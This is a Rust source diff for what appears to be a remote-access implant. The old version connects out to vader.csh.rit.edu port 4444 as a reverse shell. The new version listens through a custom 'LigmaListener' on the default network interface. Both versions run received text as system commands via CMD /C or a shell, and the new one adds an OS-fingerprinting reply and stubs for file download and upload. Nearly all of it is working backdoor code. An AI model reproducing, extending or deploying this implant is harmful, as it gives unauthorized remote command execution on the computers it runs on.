@@ -1,42 +1,35 @@
+mod ligma;
+
+use default_net::get_default_interface;
+use ligma::LigmaListener;
 use std::env;
-use std::io;
+use std::io::{Read, Write};
 use std::path::Path;
 use std::process::Command;
 use std::str;
-
-use std::io::{Read, Write};
-use std::net::{Shutdown, TcpStream};
 use std::str::from_utf8;
 fn main() {
-    match TcpStream::connect("vader.csh.rit.edu:4444") {
-        Ok(mut stream) => {
-            println!("Successfully connected to server in port 4444");
-            loop {
-                let mut data = [0 as u8; 1024];
-                match stream.read(&mut data) {
-                    Ok(size) => {
-                        let str_data = from_utf8(&data[..size]).unwrap();
-                        if cmd(str_data, &mut stream) {
-                            break;
-                        }
-                    }
-                    Err(e) => {
-                        println!("Failed to receive data: {}", e);
-                    }
+    let mut stream = LigmaListener::new(get_default_interface().unwrap().name);
+    loop {
+        let mut data = [0 as u8; 1024];
+        match stream.read(&mut data) {
+            Ok(_) => {
+                let str_data = from_utf8(&data).unwrap();
+                let str_data = str_data.trim_matches(char::from(0));
+                if cmd(str_data, &mut stream) {
+                    break;
                 }
             }
-        }
-        Err(e) => {
-            println!("Failed to connect: {}", e);
+            Err(e) => {
+                println!("Failed to receive data: {}", e);
+            }
         }
     }
-    println!("Terminated.");
 }
 
-fn cmd(cmd: &str, stream: &mut TcpStream) -> bool {
+fn cmd(cmd: &str, stream: &mut LigmaListener) -> bool {
     if cmd.eq("exit") {
         stream.write("OK".as_bytes()).unwrap();
-        stream.shutdown(Shutdown::Both).unwrap();
         return true;
     }
     if cmd[..=1].eq("cd") {
@@ -59,10 +52,20 @@ fn cmd(cmd: &str, stream: &mut TcpStream) -> bool {
                 .as_bytes(),
             )
             .unwrap();
+    } else if cmd.len() == 5 {
+        if cmd[..=4].eq("GETOS") {
+            if cfg!(target_os = "windows") {
+                stream.write(b"WINDOWS").unwrap();
+            } else if cfg!(target_os = "linux") {
+                stream.write(b"LINUX").unwrap();
+            } else if cfg!(target_os = "freebsd") {
+                stream.write(b"BSD").unwrap();
+            } else {
+                stream.write(b"OTHER").unwrap();
+            }
+        }
     } else if cmd[..=1].eq("DL") {
-        
     } else if cmd[..=1].eq("UP") {
-
     } else {
         let cmd_out = if cfg!(windows) {
             Command::new("CMD").arg("/C").arg(&cmd).output().unwrap()
